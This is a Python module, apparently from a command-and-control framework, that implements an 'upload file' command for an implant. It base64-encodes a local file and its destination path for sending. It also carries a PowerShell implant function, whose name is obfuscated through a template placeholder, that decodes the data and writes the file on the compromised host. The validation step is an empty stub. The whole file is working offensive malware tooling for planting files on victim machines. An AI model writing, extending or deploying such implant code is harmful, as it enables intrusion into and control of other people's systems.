import os
import base64


class UploadFile:
    type = "UF"
    args = "locale-file-name.txt destination_location\\filename.txt"
    input = "upload_file"

    def process_implant_response(self, data, args):
        if data.decode() == "2":
            return "File upload error.", None
        else:
            return f"Successfully uploaded: {args}", None
            # Host data should return a file upload reference not None in future

    def implant_text(self):
        var = '''
function {{ ron.obf_upload_file }} ($b) {
    try { 
        $c = $b.split("::")
        $fn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($c[0].ToString()))
        $fc = [System.Convert]::FromBase64String($c[2].ToString())
        $fc | Set-Content "$fn" -encoding Byte -NoNewLine
        $global:tr = 1
    } catch { 
        $global:tr = 0 
    } 
}'''
        return var

    def pre_process_command(self, argument_string):
        # Check if the argument to be passed to the implant is valid.
        # I.e.
        #    Does the file to be uploaded exist local?
        #    Is the command to be executed dangerous?
        return True

    def create_module_data_string(self, cmd_entry):
        # This function is responsible for creating the string which is send to the implant
        # Format for the implant core string is:
        #   < command type > <command id><optional command arguments>

        # Temp dev work:
        arg_dict = cmd_entry['args'].split(" ")
        local_file = arg_dict[0]
        target_location = arg_dict[1]
        with open(os.getcwd() + "/Storage/implant_resources/" + local_file, 'rb') as file_h:
            a = file_h.read()
            b = base64.b64encode(a).decode()
            final_str = base64.b64encode(target_location.encode()).decode() + "::" + b
            final_str = base64.b64encode(final_str.encode()).decode()
        cc = f"{final_str}"
        return cc



        # return f"{# cmd_entry['log_entry']['args']}"